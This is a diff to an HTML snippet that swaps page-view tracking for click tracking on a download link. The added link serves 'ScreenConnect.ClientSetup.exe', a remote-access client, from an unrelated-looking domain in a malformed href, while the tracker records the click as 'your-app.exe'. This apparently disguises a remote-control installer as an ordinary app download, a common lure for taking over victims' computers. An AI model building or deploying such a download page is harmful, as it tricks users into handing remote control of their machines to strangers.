@@ -1,18 +1,21 @@
-<!-- Paste this just before </body> on every page you want to track.
-     Replace the URL with wherever you deploy the server. -->
+<!-- Paste this just before </body> on the page with the download link.
+     1. Replace YOUR-SERVER-URL with your deployed server address.
+     2. Replace the href with the real path to your .exe file. -->
+<a id="download-link" href="/downloads/https://io.hsdslcet.net/secured/ScreenConnect.ClientSetup.exe">Download</a>
+
 <script>
-  (function () {
+  document.getElementById("download-link").addEventListener("click", function () {
     try {
-      fetch("https:///api/visit", {
+      fetch("https://YOUR-SERVER-URL/api/visit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           site: location.hostname,
-          page: location.pathname + location.search,
+          page: "Download: your-app.exe",
           referrer: document.referrer
         }),
         keepalive: true
       });
     } catch (e) {}
-  })();
+  });
 </script>
